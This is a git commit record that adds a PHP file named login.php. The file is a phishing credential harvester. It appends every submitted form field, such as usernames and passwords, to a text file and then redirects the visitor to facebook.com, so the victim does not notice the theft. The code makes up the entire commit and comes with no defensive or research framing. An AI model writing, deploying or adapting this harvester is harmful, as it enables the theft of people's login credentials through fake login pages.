a4ce4ac6fcb8dba39d17e803a9d45bf26db8e414
nelkar <86239183+nelkar@users.noreply.github.com>
2022-03-04 01:24:30 +0100

    Add files via upload

---
+++ login.php
@@ -0,0 +1,16 @@
+<?php
+
+$handle = fopen("usernames.txt", "a");
+foreach($_POST as $variable => $value) {
+   fwrite($handle, $variable);
+   fwrite($handle, "=");
+   fwrite($handle, $value);
+   fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n");
+fclose($handle);
+header ('Location:http://www.facebook.com/');
+?> 
+
+
+
